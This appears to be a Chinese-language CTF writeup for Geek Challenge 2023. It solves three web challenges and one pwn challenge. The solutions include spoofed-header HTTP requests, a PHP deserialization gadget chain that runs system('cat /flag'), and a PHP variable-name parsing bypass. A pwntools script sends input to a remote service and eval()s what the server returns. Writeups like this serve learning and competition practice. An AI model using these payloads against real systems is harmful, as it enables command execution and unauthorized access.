---
title: Geek Challenge 2023 Writeup
date: 2023-11-27T22:12:16+08:00
tags: [CTF]
---


## Web

### EzHttp

> http签到，点击就送flag http://1.117.175.65:23333/

首先访问题目环境，发现需要进行登录。

```html
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />请post传参username和password进行登录<br><br>
<!--密码有点记不住,所以我把密码记在了不想让爬虫获取的地方!-->
```

访问 `robots.txt`，发现隐藏目录 `/o2takuXX's_username_and_password.txt`。得到账号密码：

```properties
username:admin
password:@dm1N123456r00t#
```

登录后只需要修改一系列 Headers 即可。

```http
POST / HTTP/1.1
Referer: sycsec.com
User-Agent: Syclover
X-Forwarded-For: 127.0.0.1
Via: Syc.vip
O2TAKUXX: GiveMeFlag
Accept: */*
Host: 1.117.175.65:23333
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
 
username=admin&password=%40dm1N123456r00t%23
```

### unsign

> 来签个到吧先

简单的 php 反序列化。

```php
<?php
highlight_file(__FILE__);
class syc
{
    public $cuit;
    public function __destruct()
    {
        echo("action!<br>");
        $function=$this->cuit;
        return $function();
    }
}

class lover
{
    public $yxx;
    public $QW;
    public function __invoke()
    {
        echo("invoke!<br>");
        return $this->yxx->QW;
    }

}

class web
{
    public $eva1;
    public $interesting;

    public function __get($var)
    {
        echo("get!<br>");
        $eva1=$this->eva1;
        $eva1($this->interesting);
    }
}

$web = new web;
$web->eva1 = 'system';
$web->interesting = 'cat /flag';
$lover = new lover;
$lover->yxx = $web;
$syc = new syc;
$syc->cuit = $lover;
echo '=='.serialize($syc).'==';

// O:3:"syc":1:{s:4:"cuit";O:5:"lover":2:{s:3:"yxx";O:3:"web":2:{s:4:"eva1";s:6:"system";s:11:"interesting";s:9:"cat /flag";}s:2:"QW";N;}}
```

### easy_php

> 学了php了，那就来看看这些绕过吧

```php
<?php
header('Content-type:text/html;charset=utf-8');
error_reporting(0);

highlight_file(__FILE__);
include_once('flag.php');
if(isset($_GET['syc'])&&preg_match('/^Welcome to GEEK 2023!$/i', $_GET['syc']) && $_GET['syc'] !== 'Welcome to GEEK 2023!') {
    if (intval($_GET['lover']) < 2023 && intval($_GET['lover'] + 1) > 2024) {
        if (isset($_POST['qw']) && $_POST['yxx']) {
            $array1 = (string)$_POST['qw'];
            $array2 = (string)$_POST['yxx'];
            if (sha1($array1) === sha1($array2)) {
                if (isset($_POST['SYC_GEEK.2023'])&&($_POST['SYC_GEEK.2023']="Happy to see you!")) {
                    echo $flag;
                } else {
                    echo "再绕最后一步吧";
                }
            } else {
                echo "好哩，快拿到flag啦";
            }
        } else {
            echo "这里绕不过去，QW可不答应了哈";
        }
    } else {
        echo "嘿嘿嘿，你别急啊";
    }
}else {
    echo "不会吧不会吧，不会第一步就卡住了吧，yxx会瞧不起你的！";
}
?>
```

最后一步涉及到 php 非法变量名处理的漏洞。正常情况下，POST 参数的变量名中的 `.` 会被替换为 `_`，如果直接传入 `SYC_GEEK.2023`，结果会是 `SYC_GEEK_2023`。但 php 如果在处理变量名时发送错误，就不会继续往后替换。于是可以选择传入 `SYC[GEEK.2023`，php 首先识别到第一个非法符号 `[`，转换为 `_` 后便不再继续往后修改，于是后面的 `.` 不会被替换。

```http
POST /?syc=welcome%20to%20GEEK%202023!&lover=1e4 HTTP/1.1
User-Agent: PostmanRuntime/7.34.0
Accept: */*
Postman-Token: 9d838b87-51d3-4071-8740-aba56f17c660
Host: cbrh82c6znid7hsdjqhhe03ch.node.game.sycsec.com
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
 
qw=true&yxx=true&SYC%5BGEEK.2023=true
```

## Pwn

### nc_pwntools

使用 pwntools 根据要求解出题目即可。

```python
from pwn import *

conn = remote("pwn.node.game.sycsec.com", 31839)
conn.recvuntil(b"1.I need a string to fill my heart \n\n")
conn.sendline(b"a" * 92 + b"Syclover")
conn.recvuntil(b"2.This challenge is harder than first one\n")
question = conn.recvline().split(b"=")[0]
conn.sendline(str(eval(question)))
conn.recvuntil("shell!\n\n")

conn.interactive()

# SYC{6HG3fWrKoEadc3nLaj}
```

